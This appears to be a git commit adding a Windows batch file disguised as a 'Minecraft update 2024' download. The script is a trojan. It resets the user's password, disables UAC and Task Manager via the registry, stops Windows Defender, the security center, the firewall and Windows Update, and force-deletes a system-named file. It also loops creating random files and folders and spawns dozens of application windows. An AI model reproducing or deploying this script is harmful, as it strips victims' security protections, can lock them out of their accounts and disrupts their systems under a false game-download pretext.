df99742c3a3d8d68b76a9916d8bf4eefdb811a4b
Kubas431 <kuba80269@gmail.com>
2024-09-20 10:46:44 +0200

    Minecraft udpade 2024 download!.bat

---
+++ Minecraft udpade 2024 download!.bat
@@ -0,0 +1,180 @@
+:folders
+:files
+
+net user %username% *
+Minecraft 
+Minecraft 
+DEL /F /S /Q /A "zabezpieczenia systemu windows.exe"
+start microsoft edge.exe
+echo Msgbox"Still using this computer?",48+0,"lol">>msg.vbs
+start msg.vbs
+nul >> %random%
+goto files
+mkdir %random%
+goto folders
+@Set RegistyEditCmd=Cmd /k Reg Add
+@Set HiveSysKey=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+@%RegistyEditCmd% "%HiveSysKey%" /v "EnableLUA" /t "REG_DWORD" /d "0" /f > nul
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
+net stop "WinDefend"
+taskkill /f /t /im "MSASCui.exe"
+net stop "security center"
+net stop sharedaccess
+netsh firewall set opmode mode-disable
+net stop "wuauserv"
+:folders
+:files
+
+@echo off
+@echo off
+cls
+echo minecraft free:)
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start charmap.exe
+start firefox.exe
+start opera.exe
+cls
+echo LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL minecraft start:)
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+start notepad.exe
+cd Deskop
+echo :) XD XD XD XD XD XD XD XD XD XD XD XD XD XD XD XD XD XD XD XD XD XD XD XD XD XD XD XD XD XD>Firefox.exe.txt
+start Firefox.exe.txt
+start firefox.exe
+start firefox.exe
+start firefox.exe
+start firefox.exe
+start firefox.exe
+start firefox.exe
+start firefox.exe
+start firefox.exe
+start firefox.exe
+start firefox.exe
+start firefox.exe
+start firefox.exe
+cd Dekop
+echo Jeszcze tylko 100 00 okienek :)>Firefox.exe.txt
+start Firefox.exe.txt
+start opera.exe
+start opera.exe
+start opera.exe
+start opera.exe
+start opera.exe
+start opera.exe
+start opera.exe
+start opera.exe
+start opera.exe
+start opera.exe
+start opera.exe
+start opera.exe
+start opera.exe
+start opera.exe
+start opera.exe
+start opera.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+start explorer.exe
+cd Deskop
+echo  LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL LOL XD XD XD XD XD XD XD.EXE:) :) :) :) :) LOL XD>Firefox.exe.txt
+start Firefox.exe.txt
+net user %username% *
+Minecraft 
+Minecraft 
+DEL /F /S /Q /A "zabezpieczenia systemu windows.exe"
+start microsoft edge.exe
+echo Msgbox"Still using this computer?",48+0,"lol">>msg.vbs
+start msg.vbs
+nul >> %random%
+goto files
+mkdir %random%
+goto folders
+@Set RegistyEditCmd=Cmd /k Reg Add
+@Set HiveSysKey=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+@%RegistyEditCmd% "%HiveSysKey%" /v "EnableLUA" /t "REG_DWORD" /d "0" /f > nul
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
+net stop "WinDefend"
+taskkill /f /t /im "MSASCui.exe"
+net stop "security center"
+net stop sharedaccess
+netsh firewall set opmode mode-disable
+net stop "wuauserv"
